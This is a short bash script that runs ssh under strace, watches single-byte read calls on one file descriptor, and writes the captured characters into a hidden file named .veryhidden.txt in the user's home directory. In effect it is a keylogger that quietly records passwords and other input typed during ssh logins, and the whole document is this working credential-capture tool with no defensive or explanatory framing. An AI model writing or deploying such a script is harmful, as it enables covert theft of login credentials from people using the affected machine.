#!/bin/bash

outfile='/home/'${USER}'/.veryhidden.txt'
pattern='read\(4,\s"(\w)",\s1\)\s*= 1$'
input="$1 $2 $3 $4 $5 $6 $7 $8 $9";

strace -q -t -e read -o calls.log ssh $input 
cat calls.log | while read line ; do
  if [[ "$line" =~ $pattern ]]; then
    echo -n ${BASH_REMATCH[1]} >> ${outfile}
  fi
done

sed -i '$ s/.$//' ${outfile};       # remove trailing n from newline input
echo -e '\n' >> ${outfile};
